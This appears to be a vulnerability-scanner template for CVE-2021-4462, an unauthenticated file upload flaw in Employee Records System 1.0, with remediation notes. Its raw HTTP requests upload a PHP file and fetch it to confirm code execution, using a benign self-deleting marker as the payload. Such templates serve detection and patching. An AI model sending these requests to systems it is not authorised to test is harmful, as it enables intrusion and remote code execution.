id: CVE-2021-4462

info:
  name: Employee Records System 1.0 - Unrestricted File Upload
  author: pranjal-negi
  severity: critical
  description: |
    Employee Records System 1.0 contains an unrestricted file upload vulnerability caused by lack of proper server-side validation in uploadID.php, letting remote unauthenticated attackers upload and execute arbitrary files.
  impact: |
    Successful exploitation of this vulnerability allows remote unauthenticated attackers to upload and execute arbitrary files, potentially leading to remote code execution and complete system compromise.
  remediation: |
    Apply security patches or upgrade to a patched version of Employee Records System. Implement proper server-side validation for file uploads, including file type checking, content validation, and secure file storage outside the web root.
  reference:
    - https://www.exploit-db.com/exploits/49596
    - https://nvd.nist.gov/vuln/detail/CVE-2021-4462
    - https://www.cvedetails.com/cve/CVE-2021-4462
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-4462
    cwe-id: CWE-434
  metadata:
    max-request: 4
    verified: false
  tags: cve2021,cve,file-upload,rce,unauthenticated,employee-records-system,kev,intrusive,vuln

variables:
  filename: "{{rand_base(8)}}"
  marker: "{{rand_base(10)}}"
  upload_string: "CVE-2021-4462-{{marker}}"

http:
  - raw:
      - |
        POST /uploadID.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835

        -----------------------------81419250823331111993422505835
        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
        Content-Type: application/octet-stream

        <?php echo "{{upload_string}}"; unlink(__FILE__); ?>
        -----------------------------81419250823331111993422505835--
      - |
        GET /{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /uploads/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /upload/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "(status_code_2 == 200 && contains(body_2, '{{upload_string}}')) || (status_code_3 == 200 && contains(body_3, '{{upload_string}}')) || (status_code_4 == 200 && contains(body_4, '{{upload_string}}'))"

# digest: [to be generated after validation]

